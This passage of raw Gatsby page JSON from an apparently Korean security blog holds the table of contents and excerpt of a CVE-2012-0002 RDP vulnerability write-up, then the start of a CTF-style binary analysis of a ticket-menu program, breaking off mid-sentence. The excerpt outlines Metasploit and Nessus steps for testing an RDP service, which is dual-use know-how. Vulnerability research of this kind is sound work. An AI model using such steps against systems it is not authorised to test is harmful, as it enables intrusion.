href=\"#%EA%B3%B5%EA%B2%A9\">공격</a></p>\n</li>\n<li>\n<p><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-%EB%B0%B0%EA%B2%BD\">취약점 분석 배경</a></p>\n</li>\n<li>\n<p><a href=\"#cve-2012-0002-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%9A%94%EC%95%BD\">CVE-2012-0002 취약점 요약</a></p>\n</li>\n<li>\n<p><a href=\"#bsod-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EB%8D%A4%ED%94%84-%ED%99%98%EA%B2%BD-%EC%84%A4%EC%A0%95\">BSOD 메모리 덤프 환경 설정</a></p>\n</li>\n<li>\n<p><a href=\"#cve-2012-0002-%EC%B7%A8%EC%95%BD%EC%A0%90-%EA%B0%9C%EC%9A%94\">CVE-2012-0002 취약점 개요</a></p>\n</li>\n<li>\n<p><a href=\"#cve-2012-0002-%EB%8C%80%EC%83%81-%EC%8B%9C%EC%8A%A4%ED%85%9C-%EB%AA%A9%EB%A1%9D\">CVE-2012-0002 대상 시스템 목록</a></p>\n</li>\n<li>\n<p><a href=\"#cve-2012-0002-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%9B%90%EB%A6%AC\">CVE-2012-0002 취약점 원리</a></p>\n</li>\n<li>\n<p><a href=\"#%EA%B3%B5%EA%B2%A9-%EA%B8%B0%EB%B2%95-%EB%B0%8F-%EA%B8%B0%EB%B3%B8-%EA%B0%9C%EB%85%90\">공격 기법 및 기본 개념</a></p>\n<ul>\n<li><a href=\"#uaf-use-after-free\">UAF (Use-After-Free)</a></li>\n<li><a href=\"#rdp-remote-desktop-protocol\">RDP (Remote Desktop Protocol)</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#rdp-%EB%93%9C%EB%9D%BC%EC%9D%B4%EB%B2%84-%ED%8C%A8%EC%B9%98-%EC%A0%84-%ED%9B%84-%EC%BD%94%EB%93%9C-%EB%B9%84%EA%B5%90\">RDP 드라이버 패치 전 후 코드 비교</a></p>\n</li>\n<li>\n<p><a href=\"#%EA%B3%B5%EA%B2%A9-%EC%BD%94%EB%93%9C\">공격 코드</a></p>\n<ul>\n<li><a href=\"#%EA%B3%B5%EA%B2%A9-%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\">공격 코드 분석</a></li>\n<li><a href=\"#%EA%B3%B5%EA%B2%A9-%EC%BD%94%EB%93%9C-%EC%8B%A4%ED%96%89\">공격 코드 실행</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%EA%B3%B5%EA%B2%A9-%EA%B8%B0%EB%B2%95-%EB%B6%84%EC%84%9D\">공격 기법 분석</a></p>\n<ul>\n<li><a href=\"#wireshark-%EB%8F%99%EC%A0%81-%EB%B6%84%EC%84%9D\">Wireshark 동적 분석</a></li>\n<li><a href=\"#windbg-%EB%8F%99%EC%A0%81-%EB%B6%84%EC%84%9D\">Windbg 동적 분석</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%EB%B3%B4%EC%95%88-%EC%97%85%EB%8D%B0%EC%9D%B4%ED%8A%B8-%EC%84%A4%EC%B9%98\">보안 업데이트 설치</a></p>\n</li>\n<li>\n<p><a href=\"#reference\">Reference</a></p>\n</li>\n</ul>\n</div>","excerpt":"취약점 분석 보고서 CVE-2012-0002  Metasploit 취약성 테스트 Nessus DB 정보 내보내기 Metasploit Exploit Framework를 통해 대상 서비스 취약성 점검을 하기 위해\nNessus를 바탕으로 점검한 결과를 DB 형태로 내보내기를 진행 파일은 xml\n유형의 Nessus 확장자 구성으로 되어있으며 해당 파일일 작업 공간에 저장\n한다.  Metasploit workspace Metasploit 상에 취약점 점검 대상의 정보를 관리하기 위해 Nessus DB정보를\n받아와 작업할 공간을 만든다.  Metasploit DB 연결 상태 확인 및 가져오기 데이터베이스 상태를 확인한 후 만약 실패로 나온다면 PostgreSQL 서비스를\n키도록 한다. db_import 명령을 통해 다운 받은 Nessus DB 결과 정보를\n불러온다.  점검 대상 서비스 정보 확인 services 명령을 통해 서비스 정보를 확인한 결과 점검 대상인 msrdp/3389\n서비스가 …","frontmatter":{"date":"December 07, 2020","title":"CVE-2012-0002 1-day 취약점 분석","categories":"windows 1-day","author":"Zer0Luck","emoji":"🥤"},"fields":{"slug":"/cve_2012_0002_1-day/"}},"next":{"id":"54ffabc8-aba0-5165-9191-3fdf4a5888e2","html":"<h1 id=\"취약점-분석\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"취약점 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석</h1>\n<h2 id=\"바이너리-개요\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94\" aria-label=\"바이너리 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 개요</h2>\n<h3 id=\"보호기법\" style=\"position:relative;\"><a href=\"#%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95\" aria-label=\"보호기법 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>보호기법</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 645px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 21.666666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAdklEQVQI143ESw6CMBQF0C5EW/q5FBJ4AVt0QLEEsQzAgdH9r8W4ATE5OSz122OYexeG9dndFl05Qa2sWgnKUP/G5uUdxilDWTpqwsmg4NIKbYXZx6b0KmoSCsfRH+4dR841uMH3PSz69UohXpJ1UcKr/Kzsvz5nhCev0FcUIgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/3ad9f6d8757c468b784bc0531e827790/af192/0.png\"\n        srcset=\"/static/3ad9f6d8757c468b784bc0531e827790/e9ff0/0.png 180w,\n/static/3ad9f6d8757c468b784bc0531e827790/f21e7/0.png 360w,\n/static/3ad9f6d8757c468b784bc0531e827790/af192/0.png 645w\"\n        sizes=\"(max-width: 645px) 100vw, 645px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>security check</p>\n<ul>\n<li>CANARY</li>\n<li>NX</li>\n<li>PIE</li>\n<li>RELRO</li>\n</ul>\n<h3 id=\"바이너리-정보\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EC%A0%95%EB%B3%B4\" aria-label=\"바이너리 정보 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 정보</h3>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">ELF <span class=\"token number\">64</span><span class=\"token operator\">-</span>bit LSB shared object\nx86<span class=\"token operator\">-</span><span class=\"token number\">64</span><span class=\"token punctuation\">,</span> version <span class=\"token number\">1</span> <span class=\"token punctuation\">(</span>SYSV<span class=\"token punctuation\">)</span>\ndynamically linked\ninterpreter <span class=\"token operator\">/</span>lib64<span class=\"token operator\">/</span>ld<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>x86<span class=\"token operator\">-</span><span class=\"token number\">64.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">2</span>\n<span class=\"token keyword\">for</span> GNU<span class=\"token operator\">/</span>Linux <span class=\"token number\">3.2</span><span class=\"token number\">.0</span>\nBuildID<span class=\"token punctuation\">[</span>sha1<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">842</span>cbd24d75c0dea40dc2e06f4996948eb59a897\nwith debug_info\nnot stripped</code></pre></div>\n<h2 id=\"바이너리-분석\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EB%B6%84%EC%84%9D\" aria-label=\"바이너리 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 분석</h2>\n<h3 id=\"바이너리-로직-흐름\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EB%A1%9C%EC%A7%81-%ED%9D%90%EB%A6%84\" aria-label=\"바이너리 로직 흐름 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 로직 흐름</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA50lEQVQoz53Q30rDMByG4d6IXZs0SfPLvzVN2nRzU4NrFatueCQoeOD9X4PgkSJ0QXhPHz74slr1TAQCHZMD1xsq+or7ktrF2oJoJp8zAlJZT0BJ61XjEAPEYFXRxViOSwqHDNViH6fp8RTvZuMCAY1ruarqxXiOMYUpu386vX18vry+j/Nxe3Ow/QYzkYp12+3iOM7HOD2s/UDBYJa8XHFhu61svPGDcYGCJlznmCVhaZ2ynWy8MI6ARkyUFFKXje91G8TaVVydG/yDw+4afT90kSp/4SvEREF4svyBL+Nt2MeC/gd/AWm2aWTnRvbGAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/eda79c8e38a5358c7d87afa20cb89a69/37523/1.png\"\n        srcset=\"/static/eda79c8e38a5358c7d87afa20cb89a69/e9ff0/1.png 180w,\n/static/eda79c8e38a5358c7d87afa20cb89a69/f21e7/1.png 360w,\n/static/eda79c8e38a5358c7d87afa20cb89a69/37523/1.png 720w,\n/static/eda79c8e38a5358c7d87afa20cb89a69/cab8c/1.png 744w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>main output</p>\n<ul>\n<li>총 4개의 메뉴를 선택할 수 있는 선택창을 확인할 수 있으며 <code class=\"language-text\">Buy</code>, <code class=\"language-text\">View</code>, <code class=\"language-text\">Use</code>, <code class=\"language-text\">Exit</code> 메뉴가 존재한다.</li>\n</ul>\n<p><strong>Buy 메뉴</strong></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 650px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 40%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABt0lEQVQoz2WJu3LTQABF9RN0tokk70paafWWbD0sy+tnTMzEQMgHQAkFMwx8CAUdNSUzNNBQ8h+gkhZ1yV5mlNi8ijP33HuV3f6lSLNLQa2NGKi1INZGGPZplzesBWW//YDB7837d7Kqevvm1ZOvn9+df/nwsfr0/pmy2DxGMV1hVMwxKudIshqEBRjoDCfE6bg7tDsO/bjpDCQv4W634PtzhC9eP1cqcYaiFkiyEvlUIEgzuFEKanM4QQwepbD9CJYbwE/G4GHSQRmHG6fwgkSapnPlOiHMwWSvTBf7Nq+W7bhctGW9afua1aqU/4VmuP9tRwy31Uz3p2b5oHz7UFltnzZ59aCJx7vGizcNZdNGN8tGpfkN5JbOs2PXaHHw7yrJv6mk+GHYj86UenmOcrZAUS9QzdfIJgLMDXFCTOimg6HlQDdtaIYNwvhx0yi7dd79hHmw+PpSqcR9mU+F9OKxjMalZF4keZhKw/akHSSSRyPp+Im03FB6SSadMJU8HEnT8bv04uza9uMrPyngR7sLZbbao5wtMRFr1MtT9NQheipBX6NdHvzP/s8veyq57qkUujG/+AXPAOjr+dyZrgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./2.png\"\n        title=\"./2.png\"\n        src=\"/static/146bf7c91637153ad5e82a2ff7d14466/a6d36/2.png\"\n        srcset=\"/static/146bf7c91637153ad5e82a2ff7d14466/e9ff0/2.png 180w,\n/static/146bf7c91637153ad5e82a2ff7d14466/f21e7/2.png 360w,\n/static/146bf7c91637153ad5e82a2ff7d14466/a6d36/2.png 650w\"\n        sizes=\"(max-width: 650px) 100vw, 650px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>Buy 메뉴</p>\n<ul>\n<li>두 가지 선택으로 <code class=\"language-text\">One ride ticket</code> , <code class=\"language-text\">One day ticket</code> 을 선택할 수 있으며, 입력 값은 <code class=\"language-text\">First name</code> , <code class=\"language-text\">Last name</code> 대입 되는 것으로 확인된다.</li>\n<li>두 번째 <code class=\"language-text\">One day tickey</code> 은 출력 문에 <code class=\"language-text\">3 meals, 1 safari pass, unlimited rides, 1 giftshop coupon</code> 옵션 값들이 기본 세팅되는 것으로 확인된다.</li>\n</ul>\n<p><strong>View 메뉴</strong></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 264px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 101.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsTAAALEwEAmpwYAAAE/0lEQVQ4yz2Ty4/bVBSHrzSINQv6mEnGieO8HDuJ40diO37b4zwnM5khybzaKbQlpd1UAtECRWHDGiF1g6pKCFW8yqISQmWFEBICIbFAIPhbGoN/KB7E4luce66O7rnnO4QpnpJ0pkOyzA5JZfqkWJkSvn5EWH5G2OoBYfkDwhZeImxwjXBPP65ojx9OlK8ejsQvH+xWP/9olH90f7/37eMnW0+/uE/evv48KbLX5llmNGeKL82p3M6crR7NudpJAl8/mfPCpTknXn6NT++dco8e/PXqbz/gzh8/443ff8I7f/4C//snOP3xW+x/9wQbn3w4Im54HW2nh7YzgOkOkC9LULQA2XwNaZpHOsuBYmrI0Dzo8S70xd1n+luvR869N6Pg3bvL+p3by/GTT59533z26wvv39kkw90by+729nI4Gi+bbXOp2+5SbOlLWTeXsqotNctZ1kRlybD8Upaa/5w/t46LFzfjCxfS8fnzqb9T6xSoxuSDr9cNkgUI8cJThINt9IZjiKoBrztAXdHh9UYIByMMxxNYXghB0WEFHZRrDbB1CeW6FFcEOSpwNXCVw3svFkqE6veeI4ZzAEnTILdt6LYHzfYTWqaDlukm56tYd3wohgPDC2H6IQy/E1tBNxKbGkrc9L31C2mSyZXWiN95BZ3BEMO9GXhBAifIOJ+ikKKL6O9OMD0+hen6OLdBIZXNoyIouHL9Fq7Nb8VtN4jYmgiWmy1Sm1mSybNrRNH24fgdjCcn4AUFbXcLfmcbgqzD9EJ4nW10h2Poloc0XUCaLiJX4kEXKzFTqUc1sYUyO12k0jTJ5itrRDP30HZNhIMhWqYBtxOiOxpBsyxYgQ+308FWvw833EJdkVGTJVQlEXyjETdUNarLEors3mI9nSYUk18jpnMbqnmMZvsSNOsydPsULeMEpvsyDOcK9BX2aYLpXYXln2H6V2M7uBZJrRmqwu0FU+qSEjdcI23nJvzOCezgGLZ3iGLFRVMfY5NWkco0sUEpoHIaMowOKqcjk28jw6zQ4wyjR3TBQFW4ucizDsmXnTViegfobQ/QH+1AUJrQbQt1WUnal/U2bN9HieNQ5HgUyiVsZDJI0/SKOE3TEcUwYPnpgmKYs5Y16wBBb4iwvwNJs+CGfTRaBsLhGF5niHCwi5bhQGm7UDQT5ZqYwNalmBOUKFuogOUPF5u5MsmshqLbM2iOA90JoNkedNuH0rYh6xbMoAM77Cd+KoaNpmHD6QwS2YP+KLb8MMqVOJS5g0UqWzjTpmVM0Nvdx/7sBDVRAS/IuLhJgy5yGIynmB2foqGo2MgwWKdoGF4Xl6/ewGBnL65JzYguVlDmDxYUUzorKCjbqAgCqlILNVlFo9VOENU26rKKiiCjKjVRFZtJXFdU1M7uxo2mHtFFNimYzhXPCqrGBH5vkEisWR4EWU0EzhbY5Mz0u3C2utCdLZhegEpdSvJMiY8NO4gy+XLyh/+/0HRPsL0/xXh6CNX0IDZ1rFM5ZAo8XL8Ly+siGO5iZ3IM291CpS7jQiqLck2Od/amEcWUUakeLSjmv6EY3gzd0WoTAgiKAklVUa5VwYkiTMeGqKpo+x7CwQBNfdWyglKVR6Olxlv9bqJNmZ8sUtksoRhmtXpz6M4EmjWD4R7B9FYcw/KPoTsHMLwjrExomdMkv4rt4ASGexhr1jQqcQH4+s0FXbRJvuyt/Qt/mWunZkZqCQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./3.png\"\n        title=\"./3.png\"\n        src=\"/static/85d60ee2d3878fda25668a68f5ec2c79/e61aa/3.png\"\n        srcset=\"/static/85d60ee2d3878fda25668a68f5ec2c79/e9ff0/3.png 180w,\n/static/85d60ee2d3878fda25668a68f5ec2c79/e61aa/3.png 264w\"\n        sizes=\"(max-width: 264px) 100vw, 264px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span>{: width=“60%” height=“60%“}</p>\n<p>View 메뉴</p>\n<p><strong>Use 메뉴</strong></p>\n<ul>\n<li>앞에서 입력한 <code class=\"language-text\">ticket</code> 들을 출력해주는 형식이며, 인덱스를 바탕으로 출력하는 것으로 보아 구조체 배열 구조임을 추측할 수 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 302px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 61.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAADU0lEQVQoz03Ry2/bBADHcR/4F4ApzdOxGztx/Igdv/OwHSdxnUfTKG3TroxKTAKJbYdqB6YhEKWIdRpooz0hcYMDFyROIKSdxmHHHZCvE5wQlrgQCajsH1qREIfP4fu7/ohS+Zh5NXPElMi7zJXMbUbRHjF1/mNGNc4Ywzq/pBlnjOae1+yXHuSkr7/6ZPH0+99vPXvy/NazH39ZPv3h+fDxN3++8eQ7ZL882yc67uGq441WentjZXXCVbkir5pmf1Us86sc+UJ9VaDEVZGWVrlsdVXZW8L77B5mD0+xe/4pggcfofXFI+w+/vaP7Of3e0QQHiKYTOD0AxitLiTVgGa3URVE1EQZvNwEzXKgWA68rCCbK6WZtWLySiafvJzJJ1cy+b+z6zWs2Qc3yldvEsR4861kONpM/I1pUhWUpOMHCSepiTscJ6PZdjKe7SS61Um4hpbodjfJFKmkuF5Ly0w9pdh6UqCZC5KuQ6y9dlgjhwQRTq9jMJlgtDmHpOroh1N0e32QdAUbsznC2RY0qwVRM2A6PcwXuxhOZ1A0E/5oiq3dJWzHhyjtX5f4kCCExpuR1NyLhMYy4hvLSDUPI0HeixhuK6oJ25Go7EWcsB1V+UWk6NciWT2I6uJOxNbnUV3aiQR5+VNN2PlZbLyzUxdvEMQgvBkH4904nL0eN41hLDW9uMrbcWm9GZcZNS5SclyilbhIK3GBkuNCuREX6f+23wpU49fSuvZXjb/2NsPNCcLxryIcj2E7HmSzBcUwYTsuvGAEPwjB1nk0VB1FuoIcSaFArf8PfSlfZsBw89s0OyCIbu8gtTrddLrYT1veIG2a7dTu9lJ3OEkH463U6Qep3nZT2+mnmtVJg8ksbVrd1HYHqdjUX/RFyxmCpCdH2UKLINruPhzPx3CygOOH6PSGEGQdjaaFAsWCrHDIkwyyZAVlhr/sHFlBgaqi9O/bFxQrguG2j2g2IIhufw9+4KPT89C0THgDHxTLwA0GsLstcJKAhq7CHfRhtm0IcgP98QhWp4VcMZ+ulfIXOZIEU9s8olmPIDTjFFb7QxjWMQz7GHb7BIr6LszWCaz2CVT9vcvN8U5hWh9AM95H270H0z6GJN9JJfnOhaTchao9PFLU+8Q/mO6DaPGxvM4AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./4.png\"\n        title=\"./4.png\"\n        src=\"/static/2d9d6d7a3cebd28808aa00d1593a9515/5f1d2/4.png\"\n        srcset=\"/static/2d9d6d7a3cebd28808aa00d1593a9515/e9ff0/4.png 180w,\n/static/2d9d6d7a3cebd28808aa00d1593a9515/5f1d2/4.png 302w\"\n        sizes=\"(max-width: 302px) 100vw, 302px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span>{: width=“60%” height=“60%“}</p>\n<p>Use 메뉴</p>\n<ul>\n<li>0 번째 인덱스를 선택한 결과 <code class=\"language-text\">Thank you Have a good time!</code> 문자열이 출력되지만 1 번째 인덱스 같은 경우 구조체 멤버들의 값을 설정할 수 있는 옵션을 추가적으로 할 수 있다.</li>\n<li>0 번째 인덱스 같은 경우 <code class=\"language-text\">Buy</code> 메뉴의 1 번째 옵션 <code class=\"language-text\">One ride ticket</code> 이다.</li>\n</ul>\n<h3 id=\"main-함수-분석\" style=\"position:relative;\"><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"main 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>main 함수 분석</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 631px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 81.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAAsTAAALEwEAmpwYAAABB0lEQVQoz5WSwW7DMAiG8/7vN62XKqpSLbWVOIkdsAFjT2m6w24xQsg+fMCvn+52Wx+PbRjCkc99GHZj8PWCd8VpiuMI1qIxaG00JlobETNiXhburE3zHCmpsJZSrweRdve7fn1Huy6kCQVCCpGolPrO8vf49z0jJe36Hp4/m90ccARGTz4S1QsrHLBzaZ4wRa1NS59wCLIsOr4kBCWWcrnHAQPkEKjvwVoG4LbJ3su26Thm51RE2+BlIe+TiDJzaZF9as6Ih2DvM4A0wwAyz7KuNQTOWdvgENgYJBJmJcptVjGXEDKRNPvsHE0TIB4t9p1VS6tVxbk6z3Jd8AeeplRraTzND/wLkHuuMIf6ThcAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./5.png\"\n        title=\"./5.png\"\n        src=\"/static/01e0266c7cd6d3ed46884f8328e782a4/4597d/5.png\"\n        srcset=\"/static/01e0266c7cd6d3ed46884f8328e782a4/e9ff0/5.png 180w,\n/static/01e0266c7cd6d3ed46884f8328e782a4/f21e7/5.png 360w,\n/static/01e0266c7cd6d3ed46884f8328e782a4/4597d/5.png 631w\"\n        sizes=\"(max-width: 631px) 100vw, 631px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>main 함수</p>\n<ul>\n<li>\n<p>메뉴와 관련된 함수들</p>\n<ul>\n<li>buy_ticket()</li>\n<li>view_ticket()</li>\n<li>use_ticket()</li>\n<li>exit()</li>\n</ul>\n</li>\n<li>\n<p>각각의 케이스 별로 선택하여 해당 함수들을 호출 할 수 